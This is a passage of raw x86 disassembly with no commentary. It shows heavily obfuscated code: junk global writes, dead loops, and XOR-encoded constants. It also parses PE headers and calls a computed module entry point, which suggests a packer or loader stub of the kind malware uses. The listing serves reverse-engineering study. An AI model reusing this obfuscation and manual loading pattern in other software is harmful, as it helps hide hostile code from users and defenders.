  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ec3c
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e7e2,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x430522
  409649:	sub    DWORD PTR ds:0x43050a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42eeac,0x430522
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x43052a,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e7ee,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e7de,0x1f
  409686:	cmp    DWORD PTR ds:0x42e7de,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e7de,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42eb54
  4096b3:	cmp    DWORD PTR ds:0x42e7de,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e7de
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e7de,eax
  4096cb:	mov    eax,ds:0x42e7de
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e7de,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42eea4,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42eea4
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42eea4,ecx
  4096f7:	cmp    DWORD PTR ds:0x42eea4,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42eea4,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430512
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ec40
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43050a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ee94,0x1a
  409737:	cmp    DWORD PTR ds:0x42ee94,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ee94,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42eeac
  409763:	call   DWORD PTR ds:0x42ec44
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ee94
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ee94,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x43052e,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x4305ce,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ee98
  4097a8:	sub    DWORD PTR ds:0x42e7e2,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x4305c6
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e7da,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e7da
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e7da,edx
  4097d5:	cmp    DWORD PTR ds:0x42e7da,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x4305d6
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42eb58
  4097f0:	cmp    DWORD PTR ds:0x42e7da,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e7da
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e7da,edx
  40980a:	cmp    DWORD PTR ds:0x42e7da,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x4305c2,0x1c
  40982b:	cmp    DWORD PTR ds:0x4305c2,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x4305c2,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ec48
  409850:	cmp    DWORD PTR ds:0x4305c2,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x4305c2
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x4305c2,edx
  40986a:	mov    edx,DWORD PTR ds:0x4305c2
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x4305c2,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ee94,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x4305ca,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x430522,0x42e7f2
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x43053a,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x43053a
  4098b7:	inc    eax
  4098b8:	mov    ds:0x43053a,eax
  4098bd:	cmp    DWORD PTR ds:0x43053a,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x43053a,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42ec4c
  4098eb:	cmp    DWORD PTR ds:0x43053a,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x43053a
  4098fd:	inc    eax
  4098fe:	mov    ds:0x43053a,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x430542,0x430526
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ee9c,0x42e7ee
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ee94,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ee94
  409945:	inc    eax
  409946:	mov    ds:0x42ee94,eax
  40994b:	cmp    DWORD PTR ds:0x42ee94,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ee94,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42eb60
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43051e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e7de,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x430542
  409998:	xor    ecx,DWORD PTR ds:0x43053e
  40999e:	mov    DWORD PTR ds:0x430542,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x430536,0x42ee94
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e7ea,0x42ee88
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x43053a,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x430532,0x430542
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e7de,0x42e7ea
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e7f2,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x4305c6,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e7da,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430506,0x4305d2
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e7de
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x4305da,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e7ee,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e7ee,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ee90,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43051a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e7de,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x4305ce,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x43053e,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x4305da,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x4305ca,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x4305d2,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ee8c,0x42e7de
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x43053a
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ee8c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x4305c6,0x42eea8
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e7ea,0x43051a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x43052a,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e7de,0x4305ce
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x430542
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42eea8,0x430516
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42eea4,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430506,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430516
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x430522,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43050e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x43053a,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x430522,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e7f6,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x43053e,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x4305c2,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x4305c6,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x4305c6,0x42ee8c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
